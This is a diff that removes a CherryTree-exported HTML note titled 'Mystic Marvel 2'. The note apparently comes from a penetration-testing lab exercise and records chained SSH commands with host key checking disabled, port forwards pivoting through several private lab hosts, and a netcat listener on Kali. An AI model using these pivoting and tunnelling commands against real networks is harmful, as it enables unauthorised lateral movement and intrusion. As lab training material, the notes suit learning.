@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>Mystic Marvel 2</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>Mystic Marvel 2</h1><br/>ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220 -L10100:10.50.30.20:22 -X  &lt;from host to kali<br /><br /><br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10200:192.168.0.13:22  -L10400:192.168.0.27:22  &lt;to t1<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -R192.168.0.13:12314:127.0.0.1:12314   &lt; to t2 (recieve t3 via nc)<br />On Kali &gt;&gt; nc -nlvp 12314<br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:192.168.0.23:22 -L 10600:192.168.0.10:22  &lt; to t4 (forward to 5 and 6)<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1   &lt; to t5<br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1  &lt; to t6<br /><br /><br /><br /><br />Congrats! You are an 31337 H4x0r!</div></body></html>
